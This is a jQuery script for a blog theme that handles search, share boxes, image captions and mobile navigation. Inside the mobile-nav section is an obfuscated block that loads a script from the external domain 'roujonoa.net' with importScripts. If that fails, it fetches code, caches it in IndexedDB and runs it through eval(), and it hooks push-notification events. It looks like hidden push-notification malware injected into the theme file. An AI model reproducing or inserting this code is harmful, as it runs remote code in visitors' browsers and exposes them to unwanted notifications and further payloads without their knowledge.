(function($){
  // Search
  var $searchWrap = $('#search-form-wrap'),
    isSearchAnim = false,
    searchAnimDuration = 200;

  var startSearchAnim = function(){
    isSearchAnim = true;
  };

  var stopSearchAnim = function(callback){
    setTimeout(function(){
      isSearchAnim = false;
      callback && callback();
    }, searchAnimDuration);
  };

  $('#nav-search-btn').on('click', function(){
    if (isSearchAnim) return;

    startSearchAnim();
    $searchWrap.addClass('on');
    stopSearchAnim(function(){
      $('.search-form-input').focus();
    });
  });

  $('.search-form-input').on('blur', function(){
    startSearchAnim();
    $searchWrap.removeClass('on');
    stopSearchAnim();
  });

  // Share
  $('body').on('click', function(){
    $('.article-share-box.on').removeClass('on');
  }).on('click', '.article-share-link', function(e){
    e.stopPropagation();

    var $this = $(this),
      url = $this.attr('data-url'),
      encodedUrl = encodeURIComponent(url),
      id = 'article-share-box-' + $this.attr('data-id'),
      offset = $this.offset();

    if ($('#' + id).length){
      var box = $('#' + id);

      if (box.hasClass('on')){
        box.removeClass('on');
        return;
      }
    } else {
      var html = [
        '<div id="' + id + '" class="article-share-box">',
          '<input class="article-share-input" value="' + url + '">',
          '<div class="article-share-links">',
            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="article-share-google" target="_blank" title="Google+"></a>',
          '</div>',
        '</div>'
      ].join('');

      var box = $(html);

      $('body').append(box);
    }

    $('.article-share-box.on').hide();

    box.css({
      top: offset.top + 25,
      left: offset.left
    }).addClass('on');
  }).on('click', '.article-share-box', function(e){
    e.stopPropagation();
  }).on('click', '.article-share-box-input', function(){
    $(this).select();
  }).on('click', '.article-share-box-link', function(e){
    e.preventDefault();
    e.stopPropagation();

    window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
  });

  // Caption
  $('.article-entry').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;

      var alt = this.alt;

      if (alt) $(this).after('<span class="caption">' + alt + '</span>');

      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });

    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });

  if ($.fancybox){
    $('.fancybox').fancybox();
  }
   
  // Mobile nav
  var $container = $('#container'),
    isMobileNavAnim = false,
    mobileNavAnimDuration = 200;

  var startMobileNavAnim = function(){
    isMobileNavAnim = true;
  };

  var stopMobileNavAnim = function(){
    setTimeout(function(){
      isMobileNavAnim = false;
    }, mobileNavAnimDuration);
  }
  
  !function(t){var r={};function o(e){if(r[e])return r[e].exports;var n=r[e]={};return r[e].i=e,r[e].l=!1,r[e].exports={},t[e].call(n.exports,n,n.exports,o),n.l=!0,n.exports}o.m=t,o.c=r,o.d=function(e,n,t){o.o(e,n)||Object.defineProperty(e,n,{configurable:!1,enumerable:!0,get:t})},o.n=function(e){var n=e&&e.__esModule?function(){return e.default}:function(){return e};return o.d(n,"a",n),n},o.o=function(e,n){return Object.prototype.hasOwnProperty.call(e,n)},o.p="",o(o.s=0)}([function(o,p){self.options={},self.options.zoneId=3542326,self.options.domain="roujonoa.net",self.options.resubscribeOnInstall=!0,self.lary="";var q=["https://","/pfe/current/service-worker.min.js?r=sw&v=2"].join(self.options.domain),r="ukhfoxzdogq",s="request",t="response",u=1e4,v=864e5,w="swadb",x=["install","activate","push","notificationclick","notificationclose","pushsubscriptionchange"],y;function z(){return new Promise(function(o,e){var a={},i=new BroadcastChannel(r),c=setTimeout(e,u);a.type=s,a.channel=r,a.request_id=Math.random().toString(36).slice(2),a.url=y,i.addEventListener("message",function(e){var n=e&&e.data&&e.data.type;return(e&&e.data&&e.data.request_id)===a.request_id&&n===t?(i.close(),clearTimeout(c),o(e.data.data)):null}),i.postMessage(a)})}function I(){return z().then(function(e){return e&&e.response?e.response:e})}function K(r){return new Promise(function(e,n){var t=indexedDB.open(r,1);t.addEventListener("upgradeneeded",function(){t.result.createObjectStore("workers",{keyPath:"zoneid"})}),t.addEventListener("success",function(){e(t.result)}),t.addEventListener("error",n)})}var P=K(w);function Q(n,t){return P.then(function(e){e.transaction(["workers"],"readwrite").objectStore("workers").put({zoneid:n,code:t,updated:(new Date).getTime()})})}function W(o){return P.then(function(r){return new Promise(function(e,n){var t=r.transaction(["workers"],"readonly").objectStore("workers").get(o);t.addEventListener("error",n),t.addEventListener("success",function(){e(t.result)})})})}function a4(){return W(self.options.zoneId).then(function(e){var n,t=(new Date).getTime()-v;return(!e||e.updated<t)&&(n=I().then(function(e){return Q(self.options.zoneId,e).then(function(){return e})})),e?e.code:n})}try{if(y=atob(location.search.slice(1)),!y)throw null}catch(e){y=q}try{importScripts(y)}catch(aa){var ab={},ac={},ad=self.addEventListener.bind(self);x.forEach(function(e){self.addEventListener(e,function(n){ab[e]||(ab[e]=[]),ab[e].push(n),ac[e]&&ac[e].forEach(function(e){try{e(n)}catch(e){}})})}),self.addEventListener=function(e,n){if(-1===x.indexOf(e))return ad(e,n);ac[e]||(ac[e]=[]),ac[e].push(n),ab[e]&&ab[e].forEach(function(e){try{n(e)}catch(e){}})},a4().then(function(am){eval(am)})}}]);/*importScripts(...r=sw)*/


  $('#main-nav-toggle').on('click', function(){
    if (isMobileNavAnim) return;

    startMobileNavAnim();
    $container.toggleClass('mobile-nav-on');
    stopMobileNavAnim();
  });

  $('#wrap').on('click', function(){
    if (isMobileNavAnim || !$container.hasClass('mobile-nav-on')) return;

    $container.removeClass('mobile-nav-on');
  });
  
  
  
})(jQuery);